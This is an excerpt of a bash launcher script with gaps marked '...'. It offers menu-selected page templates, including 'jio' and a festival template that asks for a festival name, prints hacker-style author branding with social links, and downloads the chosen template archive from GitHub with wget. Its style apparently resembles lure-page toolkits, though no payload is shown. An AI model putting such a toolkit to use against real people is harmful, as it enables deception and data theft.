...
sleep 1
printf "${cyan}\nNoxipom${nc}@${blue}Noxipom ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nSX-Noxipom${nc}@${blue}SXNoxipom ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        ...
        printf "\n${ask}Enter Directory:${cyan}\n\nSXNoxipom${nc}@${blue}Noxipom ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
...
$red[Author]     ${cyan} :[SX-Noxipom]
$red[Github]     ${cyan} :[https://github.com/Noxipom12] 
$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
$red[Facebook]   ${cyan} :[https://www.facebook.co/St4rX41017]"
printf "${cyan}\nSXAnon${nc}@${cyan}SXAnon ${red}$ ${nc}"
read about
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/Noxipom12/files/raw/main/${dir}.zip"
